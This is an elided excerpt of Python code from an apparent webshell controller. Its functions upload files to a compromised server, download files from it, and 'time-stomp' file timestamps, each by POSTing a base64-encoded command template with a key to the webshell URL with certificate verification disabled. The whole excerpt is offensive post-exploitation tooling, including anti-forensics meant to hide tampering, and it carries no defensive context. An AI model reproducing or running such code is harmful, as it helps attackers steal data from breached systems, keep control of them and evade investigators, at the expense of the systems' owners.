...
def upload_file(webshell, args):
    ...
    try:
        ...
        p.close()
        raw_data = base64.b64encode(bytearray(
            b64command.replace("{filename}", dest_path).replace("{content}", content.decode("utf-8")).replace("{KEY}",
                                                                                                              KEY),
            "UTF-8"))
        # print(raw_data)
        x = requests.post(URL, data=raw_data, verify=False)
...
def download_file(webshell, args):
    ...
    try:
        ...
        raw_data = base64.b64encode(
            bytearray(b64command.replace("{filename}", filename).replace("{KEY}", KEY), "UTF-8"))
        # print(raw_data)
        x = requests.post(URL, data=raw_data, verify=False)
        if "r^" in x.text:
            print("Webshell ( " + URL + " ) sent Output : \n" + x.text)
            ...
            print(
                "Webshell ( " + URL + " ) sucessfully downloaded the file")  # sent Output : \n"+base64.b64decode(x.text[8:][:-8].strip()).decode("UTF-8"))
...
def time_stomp(webshell, args):
    ...
    try:
        ...
        raw_data = base64.b64encode(bytearray(
            b64command.replace("{source_filename}", src_path).replace("{destination_filename}", dest_path).replace(
                "{KEY}", KEY), "UTF-8"))
        # print(raw_data)
        x = requests.post(URL, data=raw_data, verify=False)
        if "r^" in x.text:
